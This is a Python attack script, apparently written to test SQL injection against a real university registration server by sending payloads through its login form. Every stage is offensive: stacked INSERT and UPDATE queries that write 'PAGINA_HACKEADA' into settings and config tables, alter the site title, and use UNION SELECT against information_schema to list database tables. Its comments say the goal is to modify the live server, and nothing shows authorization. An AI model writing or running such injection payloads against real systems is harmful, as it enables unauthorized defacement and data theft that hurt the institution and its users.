#!/usr/bin/env python3
import requests, urllib3, re
urllib3.disable_warnings()

HACKED = "PAGINA_HACKEADA"
s = requests.Session()
s.verify = False
s.headers.update({'User-Agent': 'Mozilla/5.0'})

print("=== PROBANDO MODIFICAR SERVIDOR REAL ===\n")

# Test 1: Insert a unique string into settings
print("1. INSERT INTO settings:")
r1 = s.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                 data={'j_username': "' ; INSERT INTO settings(nombre,valor) VALUES(hack_test,PAGINA_HACKEADA) --", 'j_password': 'x'}, timeout=5)
r_mod1 = s.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
tc1 = re.sub(r'<[^>]+>', ' ', r_mod1.text)
tc1 = re.sub(r'\s+', ' ', tc1).strip()
print(f"   PAGINA_HACKEADA in modulos: {HACKED in tc1}")

# Test 2: Update settings
print("\n2. UPDATE settings:")
r2 = s.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                 data={'j_username': "' ; UPDATE settings SET valor=PAGINA_HACKEADA WHERE nombre=hack_test --", 'j_password': 'x'}, timeout=5)
r_mod2 = s.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
tc2 = re.sub(r'<[^>]+>', ' ', r_mod2.text)
tc2 = re.sub(r'\s+', ' ', tc2).strip()
print(f"   PAGINA_HACKEADA in modulos: {HACKED in tc2}")

# Test 3: Check index.xhtml
print("\n3. Check index.xhtml:")
r3 = s.get('https://registro.uns.edu.pe/udemsi/faces/index.xhtml', timeout=5)
tc3 = re.sub(r'<[^>]+>', ' ', r3.text)
tc3 = re.sub(r'\s+', ' ', tc3).strip()
print(f"   PAGINA_HACKEADA in index: {HACKED in tc3}")

# Test 4: Try UPDATE config
print("\n4. UPDATE config:")
r4 = s.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                 data={'j_username': "' ; UPDATE config SET valor=PAGINA_HACKEADA --", 'j_password': 'x'}, timeout=5)
r_mod4 = s.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
tc4 = re.sub(r'<[^>]+>', ' ', r_mod4.text)
tc4 = re.sub(r'\s+', ' ', tc4).strip()
print(f"   PAGINA_HACKEADA in modulos: {HACKED in tc4}")

# Test 5: UNION SELECT to extract settings data
print("\n5. UNION SELECT settings:")
r5 = s.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                 data={'j_username': "' UNION SELECT nombre, valor FROM settings --", 'j_password': 'x'}, timeout=5)
r_mod5 = s.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
tc5 = re.sub(r'<[^>]+>', ' ', r_mod5.text)
tc5 = re.sub(r'\s+', ' ', tc5).strip()
print(f"   PAGINA_HACKEADA visible: {HACKED in tc5}")

# Test 6: Try to change index.xhtml via config
print("\n6. UPDATE config (title):")
r6 = s.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                 data={'j_username': "' ; UPDATE config SET valor='control' WHERE nombre='title' --", 'j_password': 'x'}, timeout=5)
r_index6 = s.get('https://registro.uns.edu.pe/udemsi/faces/index.xhtml', timeout=5)
tc6 = re.sub(r'<[^>]+>', ' ', r_index6.text)
tc6 = re.sub(r'\s+', ' ', tc6).strip()
# Check if "CONTROL DE ACCESO" changed
if 'CONTROL DE ACCESO' not in tc6 and 'control' in tc6.lower():
    print("   [!] TITLE CHANGED!")
elif 'PAGINA_HACKEADA' in tc6:
    print("   [!] PAGINA_HACKEADA in index.xhtml!")
else:
    print("   No change in index.xhtml")

# Test 7: Try to read settings data through UNION
print("\n7. EXTRACCION settings:")
# Try different column counts
for cols in ["nombre", "nombre, valor", "nombre, valor, 1", "nombre, valor, 1, 2"]:
    payload = f"' UNION SELECT {cols} FROM settings --"
    r7 = s.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                     data={'j_username': payload, 'j_password': 'x'}, timeout=5)
    r_mod7 = s.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
    tc7 = re.sub(r'<[^>]+>', ' ', r_mod7.text)
    tc7 = re.sub(r'\s+', ' ', tc7).strip()
    # Check for unique content
    if tc7 != re.sub(r'<[^>]+>', ' ', requests.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5).text):
        print(f"   [!] Different content: {cols}")

# Test 8: Try to extract table names
print("\n8. EXTRACCION TABLAS:")
table_payloads = [
    "' UNION SELECT table_name FROM information_schema.tables --",
    "' UNION SELECT table_schema FROM information_schema.tables --",
]
for tp in table_payloads:
    r8 = s.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                     data={'j_username': tp, 'j_password': 'x'}, timeout=5)
    r_mod8 = s.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
    tc8 = re.sub(r'<[^>]+>', ' ', r_mod8.text)
    tc8 = re.sub(r'\s+', ' ', tc8).strip()
    if 'table_name' in tc8.lower():
        print(f"   [!] Table names found: {tp[:60]}")
        # Extract table names
        tables = re.findall(r'table_name[^<]*', tc8)
        print(f"   Tables: {tables[:10]}")
    else:
        print(f"   No table names: {tp[:60]}")

print("\n=== RESUMEN ===")
print("Si algun INSERT/UPDATE funciono, el servidor REAL cambio")
print("Si PAGINA_HACKEADA aparece en modulos.xhtml o index.xhtml,")
print("la modificacion se reflejo en el servidor real")
